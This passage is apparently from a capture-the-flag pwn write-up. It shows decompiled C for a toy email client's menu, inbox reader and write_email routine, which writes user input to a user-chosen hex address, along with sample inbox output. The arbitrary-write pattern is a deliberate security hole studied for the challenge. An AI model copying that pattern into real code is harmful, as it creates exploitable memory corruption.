class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Sorry, your license </span><span style="--0:#005CC5;--1:#79B8FF">\&#39;%s\&#39;</span><span style="--0:#032F62;--1:#9ECBFF"> limits you to sending </span><span style="--0:#005CC5;--1:#79B8FF">%d</span><span style="--0:#032F62;--1:#9ECBFF"> emails :(&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Trial&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">      </span><span style="--0:#BF3441;--1:#F97583">goto</span><span style="--0:#24292E;--1:#E1E4E8"> exit;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">write_email</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">else</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (choice </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;server&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">mail_server_info</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">else</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (choice </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;help&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">print_help</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">else</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (choice </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;exit&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:6ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">      </span><span style="--0:#6F42C1;--1:#B392F0">exit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Unknown command. Type </span><span style="--0:#005CC5;--1:#79B8FF">\&#39;</span><span style="--0:#032F62;--1:#9ECBFF">help</span><span style="--0:#005CC5;--1:#79B8FF">\&#39;</span><span style="--0:#032F62;--1:#9ECBFF"> for options.&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">goto</span><span style="--0:#24292E;--1:#E1E4E8"> menu_loop;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">read_emails</span><span style="--0:#24292E;--1:#E1E4E8">();</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="if (choice != 'read') {  if (choice == 'write') {    if (3 < sent_mails) {      __printf_chk(2,&#34;Sorry, your license \'%s\' limits you to sending %d emails :(&#34;,&#34;Trial&#34;,3);      goto exit;    }    write_email();  }  else if (choice == 'server') {    mail_server_info();  }  else if (choice == 'help') {    print_help();  }  else {    if (choice == 'exit') {      exit(0);    }    puts(&#34;Unknown command. Type \'help\' for options.&#34;);  }  goto menu_loop;}read_emails();"><div></div></button></div></figure></div>
<p><code>read_emails()</code> loops through the ptrs present in the inbox and prints the contents present at the address the ptrs points to.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:77ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">read_emails</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">void</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">{</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">license;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">ulong idx;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">ulong i;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">long</span><span style="--0:#24292E;--1:#E1E4E8"> offset;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">i </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;=== Inbox ===&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">do</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">offset </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">idx </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">ffffffff</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">i </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">Mail #</span><span style="--0:#005CC5;--1:#79B8FF">%d</span><span style="--0:#032F62;--1:#9ECBFF">:</span><span style="--0:#005CC5;--1:#79B8FF">\n%s\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,idx,</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">(undefined8 </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">)(</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">inbox </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> offset));</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">} </span><span style="--0:#BF3441;--1:#F97583">while</span><span style="--0:#24292E;--1:#E1E4E8"> (i </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">4</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="void read_emails(void){  char *license;  ulong idx;  ulong i;  long offset;...SNIP...  i = 1;  puts(&#34;=== Inbox ===&#34;);  do {    offset = i * 8;    idx = i &#38; 0xffffffff;    i = i + 1;    __printf_chk(2,&#34;\nMail #%d:\n%s\n&#34;,idx,*(undefined8 *)(&#38;inbox + offset));  } while (i != 4);  return;}"><div></div></button></div></figure></div>
<p><img src="https://github.com/user-attachments/assets/bc0d721a-d9ee-41d4-b25a-d1a5c972eb17" alt/></p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:40ch"><code><div class="ec-line"><div class="code"><span style="--0:#BF3441;--1:#F97583">&gt;</span><span style="--0:#24292E;--1:#E1E4E8"> read</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Inbox</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">===</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#616972;--1:#99A0A6">#1:</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">From:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pwn@exit.ctf</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Subject:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Hello!</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Body:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Just</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">saying</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">hi.</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Mail</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#616972;--1:#99A0A6">#2:</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">From:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">alice@exitnction.ctf</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Subject:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Meeting</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Body:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">Don&#39;t forget our meeting tomorrow.</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">Mail #3:</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">From: bob@exitnction.ctf</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">Subject: Lunch</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">Body: Let&#39;s</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">have</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">lunch</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">today.</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#BF3441;--1:#F97583">&gt;</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="> read=== Inbox ===Mail #1:From: pwn@exit.ctfSubject: Hello!Body: Just saying hi.Mail #2:From: alice@exitnction.ctfSubject: MeetingBody: Don't forget our meeting tomorrow.Mail #3:From: bob@exitnction.ctfSubject: LunchBody: Let's have lunch today.>"><div></div></button></div></figure></div>
<p><code>write_email()</code> asks for a recipient address (as hex), then an 8-byte subject and a 64-byte body. It copies the subject and body from stack buffers into <code>recipient</code>.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:90ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">Enter recipient email address as hex (e.g. 0x7774664065786974): 0x&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">__isoc23_scanf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">%lx</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">getc</span><span style="--0:#24292E;--1:#E1E4E8">(stdin);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">Enter Subject (8 chars): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fgets</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#AE4B07;--1:#FFAB70">subject</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#005CC5;--1:#79B8FF">9</span><span style="--0:#24292E;--1:#E1E4E8">,stdin);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">pos </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">strcspn</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#AE4B07;--1:#FFAB70">subject</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">subject)[pos] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\0</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">__printf_chk</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">Enter Body (64 chars): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#6F42C1;--1:#B392F0">fgets</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#AE4B07;--1:#FFAB70">body</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#005CC5;--1:#79B8FF">65</span><span style="--0:#24292E;--1:#E1E4E8">,stdin);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">pos </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">strcspn</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#AE4B07;--1:#FFAB70">body</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\n</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#BF3441;--1:#F97583">&amp;</span><span style="--0:#24292E;--1:#E1E4E8">body)[pos] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\0</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">/* If subject not empty: write the 8-byte aligned subject into *recipient */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (subject </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\0</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent">   </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">recipient </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">CONCAT71</span><span style="--0:#24292E;--1:#E1E4E8">(uStack_6f,subject);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">/* If body not empty: write multiple 8-byte words from local stack into recipient[0..7] */</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (body </span><span style="--0:#BF3441;--1:#F97583">!=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#005CC5;--1:#79B8FF">\0</span><span style="--0:#032F62;--1:#9ECBFF">&#39;</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">  </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">recipient </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">CONCAT71</span><span style="--0:#24292E;--1:#E1E4E8">(uStack_66,body);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">  </span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> uStack_5f;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent">  </span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> local_57;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent">  </span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> uStack_4f;</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent">  </span><span style="--0:#AE4B07;--1:#FFAB70">recipient</span><span 